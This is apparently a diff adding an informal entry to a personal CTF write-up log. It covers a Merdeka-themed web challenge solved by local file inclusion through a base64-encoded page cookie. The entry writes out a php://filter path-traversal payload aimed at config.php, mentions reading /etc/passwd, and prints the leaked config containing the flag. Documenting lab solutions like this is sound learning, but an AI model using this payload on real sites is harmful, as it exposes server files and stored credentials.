@@ -129,6 +129,60 @@ and the key : blorpy
 
 all i need to do is ppput it into a Vigenere Cipher webpage and DONE
 
+# 5
+OK next one , this one not fully solve by me thanks to a community fella in their dc server , still gotta record this thing down for fun
+This ctf is a indi one called 3108 , merdeka themed
+challenge link (not sure how long it will be up) = https://b1bf68f7fd.bahterasiber.my/
+
+When you open the link , you immediately get blasted by music which sets you in merdeka mood. THere are 3 songs, keranamu Malaysia , tanggal31 and Jalur Gemilang
+there are 3 hyeriinks which will each display the lyrics of one of the songs and an audio player to play the song and sing along. 
+
+starting of all web challenge it to look at its source code, it was short , very short
+the entire script was :
+    function setPage(page) {
+        const encodedPage = btoa(page);
+        document.cookie = "page=" + encodedPage + ";path=/";
+        location.reload();
+    }
+
+so i tried to do path traversal first realizing i was dumb
+
+then i followed the 5 line script which by the way wil trigger everytime one of the hyperlinks are clicked and set the "page" variable to the respective page
+then it encodes the page in base 64 and sets it into the cookie named page
+finally, it reloads the page 
+
+i tried to use burpsuite for at least 5 hours trying different cookies and paths 
+i even got access to etc/passwd and /bin/bash
+that aside i also tried to extract information from the audio and even the BACKGROUND IMAGE using binwalk and stings, no luck.
+
+finally after so many tries , time was up and i asked 
+to apparently i was right but wrong, i used php wrapper but not on the config , only on the index file 
+
+
+yeah thats it , you use the wrapper on the config file : php://filter/convert.base64-encode/resource=../../../var/www/html/config.php
+
+
+the website returned : PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gImN1YmFhbiBtZW5nZWhhY2sga2EgaXR1IjsKJHBhc3N3b3JkID0gIjMxMDh7bTRyMV9rMXQ0X3c0cmc0X24zZzRyNH0iOwokZGF0YWJhc2UgPSAiZmxhZyI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgplY2hvICJDb25uZWN0ZWQgc3VjY2Vzc2Z1bGx5IjsKPz4K
+
+
+when decoded we get the php file and BOOM its there : 
+<?php
+$host = "localhost";
+$username = "cubaan mengehack ka itu";
+$password = "3108{m4r1_k1t4_w4rg4_n3g4r4}";
+$database = "flag";
+
+$conn = new mysqli($host, $username, $password, $database);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+echo "Connected successfully";
+?>
+
+
+
 
 
 
